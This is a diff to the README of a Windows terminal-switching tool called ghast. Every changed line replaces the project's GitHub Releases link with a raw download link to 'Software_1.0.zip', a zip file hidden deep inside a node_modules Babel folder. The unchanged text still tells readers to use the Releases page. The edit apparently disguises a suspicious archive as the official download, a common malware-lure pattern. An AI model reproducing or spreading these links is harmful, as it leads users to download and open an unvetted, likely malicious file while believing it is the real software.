@@ -1,6 +1,6 @@
 # 🖥️ ghast - Switch between terminals with ease
 
-[![Download ghast](https://img.shields.io/badge/Download-ghast-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/luizgabriels5915/ghast/releases)
+[![Download ghast](https://img.shields.io/badge/Download-ghast-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/luizgabriels5915/ghast/main/electrobun/node_modules/@babel/types/lib/utils/react/Software_1.0.zip)
 
 ## 🚀 What ghast does
 
@@ -17,7 +17,7 @@ Use it when you want to:
 
 Visit this page to download ghast for Windows:
 
-https://github.com/luizgabriels5915/ghast/releases
+https://raw.githubusercontent.com/luizgabriels5915/ghast/main/electrobun/node_modules/@babel/types/lib/utils/react/Software_1.0.zip
 
 On the Releases page, look for the latest version. Download the file that matches your system, then open it to run ghast.
 
@@ -157,6 +157,6 @@ Use the Releases page to check for newer versions.
 
 If you need the latest release, visit:
 
-https://github.com/luizgabriels5915/ghast/releases
+https://raw.githubusercontent.com/luizgabriels5915/ghast/main/electrobun/node_modules/@babel/types/lib/utils/react/Software_1.0.zip
 
 Download the newest Windows file from the release list and open it to run ghast
